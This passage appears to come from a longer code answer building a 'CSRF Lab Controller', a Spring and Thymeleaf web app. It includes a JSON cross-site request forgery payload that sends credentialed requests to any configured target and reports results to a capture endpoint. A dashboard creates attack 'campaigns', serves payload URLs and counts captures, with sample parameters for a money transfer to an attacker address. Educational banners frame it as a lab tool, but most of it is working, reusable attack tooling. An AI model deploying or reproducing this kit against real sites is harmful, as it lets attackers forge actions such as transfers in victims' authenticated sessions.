    </div>
    
    <script th:inline="javascript">
        /*<![CDATA[*/
        
        const config = {
            campaignId: /*[[${campaign.id}]]*/ '',
            targetUrl: /*[[${campaign.config.targetUrl}]]*/ '',
            method: /*[[${campaign.config.method}]]*/ 'POST',
            parameters: /*[[${campaign.config.parameters}]]*/ {},
            headers: /*[[${campaign.config.headers}]]*/ {},
            delayMs: /*[[${campaign.config.options.delayMs}]]*/ 0
        };
        
        /**
         * Execute JSON-based CSRF attack
         * 
         * Educational Points:
         * - fetch() automatically includes credentials (cookies)
         * - CORS preflight may prevent this (good!)
         * - Some servers accept both JSON and form-encoded
         * - Custom headers trigger CORS preflight
         */
        async function execute() {
            try {
                // Prepare headers
                const headers = {
                    'Content-Type': 'application/json',
                    ...config.headers
                };
                
                // Make the request
                const response = await fetch(config.targetUrl, {
                    method: config.method,
                    headers: headers,
                    body: JSON.stringify(config.parameters),
                    credentials: 'include' // Include cookies
                });
                
                console.log('Request sent, status:', response.status);
                
                // Note: We can see the status but may not read the
                // body due to CORS
                
                // Exfiltrate result
                await fetch(`/capture/${config.campaignId}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        success: response.ok,
                        status: response.status,
                        timestamp: Date.now()
                    })
                });
                
            } catch (error) {
                console.error('CSRF attempt failed:', error);
                
                // Exfiltrate failure
                await fetch(`/capture/${config.campaignId}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        success: false,
                        error: error.message,
                        timestamp: Date.now()
                    })
                });
            }
        }
        
        setTimeout(execute, config.delayMs);
        
        /*]]>*/
    </script>
</body>
</html>
```

```html
<!-- src/main/resources/templates/dashboard.html -->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>CSRF Lab Controller - Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .stat-card h3 {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
        
        .stat-card .value {
            font-size: 36px;
            font-weight: bold;
            color: #333;
        }
        
        .campaigns-section {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .campaigns-section h2 {
            margin-bottom: 20px;
            color: #333;
        }
        
        .campaign-card {
            border: 1px solid #e0e0e0;
            padding: 20px;
            margin-bottom: 15px;
            border-radius: 6px;
            transition: all 0.3s;
        }
        
        .campaign-card:hover {
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            transform: translateY(-2px);
        }
        
        .campaign-header {
            display: flex;
            justify-content: space-between;
            align-items: start;
            margin-bottom: 15px;
        }
        
        .campaign-name {
            font-size: 20px;
            font-weight: bold;
            color: #333;
        }
        
        .campaign-id {
            font-family: monospace;
            font-size: 12px;
            color: #999;
            background: #f5f5f5;
            padding: 4px 8px;
            border-radius: 4px;
        }
        
        .campaign-description {
            color: #666;
            margin-bottom: 15px;
        }
        
        .campaign-stats {
            display: flex;
            gap: 20px;
            font-size: 14px;
            color: #666;
        }
        
        .campaign-stats span {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        button, .button {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: #667eea;
            color: white;
        }
        
        .btn-primary:hover {
            background: #5568d3;
        }
        
        .btn-secondary {
            background: #e0e0e0;
            color: #333;
        }
        
        .btn-secondary:hover {
            background: #d0d0d0;
        }
        
        .btn-danger {
            background: #f44336;
            color: white;
        }
        
        .btn-danger:hover {
            background: #d32f2f;
        }
        
        .create-campaign-btn {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: #667eea;
            color: white;
            font-size: 30px;
            border: none;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }
        
        .create-campaign-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
        }
        
        .modal-content {
            background: white;
            max-width: 600px;
            margin: 50px auto;
            padding: 30px;
            border-radius: 8px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        
        .form-group input,
        .form-group textarea,
        .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .form-group textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        .warning-banner {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        
        .warning-banner strong {
            display: block;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 CSRF Lab Controller</h1>
        <p>Educational platform for demonstrating Cross-Site Request Forgery attacks in a controlled environment</p>
    </div>
    
    <div class="warning-banner">
        <strong>⚠️ Educational Use Only</strong>
        This tool is designed for authorized security testing and education. 
        Ensure all testing is conducted in isolated lab environments with 
        proper authorization.
    </div>
    
    <div class="stats-grid">
        <div class="stat-card">
            <h3>Total Campaigns</h3>
            <div class="value" th:text="${stats.totalCampaigns}">0</div>
        </div>
        <div class="stat-card">
            <h3>Active Campaigns</h3>
            <div class="value" th:text="${stats.activeCampaigns}">0</div>
        </div>
        <div class="stat-card">
            <h3>Payloads Served</h3>
            <div class="value" th:text="${stats.totalPayloadsServed}">0</div>
        </div>
        <div class="stat-card">
            <h3>Total Captures</h3>
            <div class="value" th:text="${stats.totalCaptures}">0</div>
        </div>
    </div>
    
    <div class="campaigns-section">
        <h2>Active Campaigns</h2>
        
        <div th:if="${#lists.isEmpty(campaigns)}">
            <p style="text-align: center; color: #999; padding: 40px;">
                No campaigns yet. Click the + button to create your first campaign.
            </p>
        </div>
        
        <div th:each="campaign : ${campaigns}" class="campaign-card">
            <div class="campaign-header">
                <div>
                    <div class="campaign-name" th:text="${campaign.name}">Campaign Name</div>
                    <div class="campaign-id" th:text="${campaign.id}">campaign-id</div>
                </div>
            </div>
            
            <div class="campaign-description" th:text="${campaign.description}">
                Description of the campaign
            </div>
            
            <div class="campaign-stats">
                <span>
                    📤 <strong th:text="${campaign.metadata.payloadServedCount}">0</strong> served
                </span>
                <span>
                    📥 <strong th:text="${campaign.metadata.captureCount}">0</strong> captured
                </span>
                <span>
                    🎯 Target: <strong th:text="${campaign.config.targetUrl}">URL</strong>
                </span>
                <span>
                    📝 Method: <strong th:text="${campaign.config.method}">POST</strong>
                </span>
            </div>
            
            <div class="button-group">
                <a th:href="@{/payload/{id}(id=${campaign.id})}" 
                   class="button btn-primary" target="_blank">
                    View Payload
                </a>
                <a th:href="@{/captures/{id}(id=${campaign.id})}" 
                   class="button btn-secondary">
                    View Captures
                </a>
                <button class="button btn-secondary" 
                        th:onclick="'copyPayloadUrl(\'' + ${campaign.id} + '\')'">
                    Copy URL
                </button>
                <button class="button btn-danger" 
                        th:onclick="'deleteCampaign(\'' + ${campaign.id} + '\')'">
                    Delete
                </button>
            </div>
        </div>
    </div>
    
    <button class="create-campaign-btn" onclick="openCreateModal()">+</button>
    
    <!-- Create Campaign Modal -->
    <div id="createModal" class="modal">
        <div class="modal-content">
            <h2>Create New Campaign</h2>
            <form id="createForm" onsubmit="createCampaign(event)">
                <div class="form-group">
                    <label>Campaign Name *</label>
                    <input type="text" name="name" required 
                           placeholder="e.g., Account Transfer Attack">
                </div>
                
                <div class="form-group">
                    <label>Description</label>
                    <textarea name="description" 
                              placeholder="What does this campaign demonstrate?"></textarea>
                </div>
                
                <div class="form-group">
                    <label>Target URL *</label>
                    <input type="url" name="targetUrl" required 
                           placeholder="http://vulnerable-site.lab/api/transfer">
                </div>
                
                <div class="form-group">
                    <label>HTTP Method *</label>
                    <select name="method" required>
                        <option value="POST">POST</option>
                        <option value="GET">GET</option>
                        <option value="PUT">PUT</option>
                        <option value="DELETE">DELETE</option>
                        <option value="JSON">JSON (POST)</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Parameters (one per line: key=value)</label>
                    <textarea name="parameters" 
                              placeholder="to=attacker@example.com&#10;amount=1000"></textarea>
                </div>
                
                <div class="form-group">
                    <label>Auto-submit delay (ms)</label>
                    <input type="number" name="delayMs" value="0" min="0">
                </div>
                
                <div class="button-group">
                    <button type="submit" class="button btn-primary">
                        Create Campaign
                    </button>
                    <button type="button" class="button btn-secondary" 
                            onclick="closeCreateModal()">
                        Cancel
                    </button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        function openCreateModal() {
            document.getElementById('createModal').style.display = 'block';
        }
        
        function closeCreateModal() {
            document.getElementById('createModal').style.display = 'none';
        }
        
        async function createCampaign(event) {
            event.preventDefault();
            
            const form = event.target;
            const formData = new FormData(form);
            
            // Parse parameters
            const paramsText = formData.get('parameters');
            const parameters = {};
            if (paramsText) {
                paramsText.split('\n').forEach(line => {
                    const [key, value] = line.split('=');
                    if (key && value) {
                        parameters[key.trim()] = value.trim();
                    }
                });
            }
            
            const campaign = {
                name: formData.get('name'),
                description: formData.get('description'),
                targetUrl: formData.get('targetUrl'),
                method: formData.get('method'),
                parameters: parameters,
                options: {
                    delayMs: parseInt(formData.get('delayMs'))
                }
            };
            
            try {
                const response = await fetch('/api/campaign', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(campaign)
                });
                
                if (response.ok) {
                    alert('Campaign created successfully!');
                    location.reload();
                } else {
                    alert('Failed to create campaign');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }
        
        function copyPayloadUrl(campaignId) {
            const url = window.location.origin + '/payload/' + campaignId;
            navigator.clipboard.writeText(url);
            alert('Payload URL copied to clipboard!');
        }
        
        async function deleteCampaign(campaignId) {
            if (!confirm('Are you sure you want to delete this campaign?')) {
                return;
            }
            
            try {
                const response = await fetch(`/api/campaign/${campaignId}`, {
                    method: 'DELETE'
                });
                
                if (response.ok) {
                    location.reload();
                } else {
                    alert('Failed to delete campaign');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }
    </script>
</body>
</html>
```

Finally, add a DELETE endpoint to the controller:

```java
/**
 * Delete a campaign
 */
@DeleteMapping("/api/campaign/{campaignId}")
@ResponseBody
public ResponseEntity<Map<String, String>> deleteCampaign(
        @PathVariable String campaignId) {
    
    boolean deleted = campaignService.deleteCampaign(campaignId);
    
    if (deleted) {
        return ResponseEntity.ok(Map.of(
            "status", "deleted",
            "campaignId", campaignId
        ));
    } else {
        return ResponseEntity.notFound().build();
    }
}
```

This comprehensive version includes:
- Extensive inline documentation
- Multiple attack methods (GET, POST, JSON)
- Flexible configuration options
- Campaign management dashboard
- Data capture and analysis
- Statistics and reporting
- Educational comments throughout
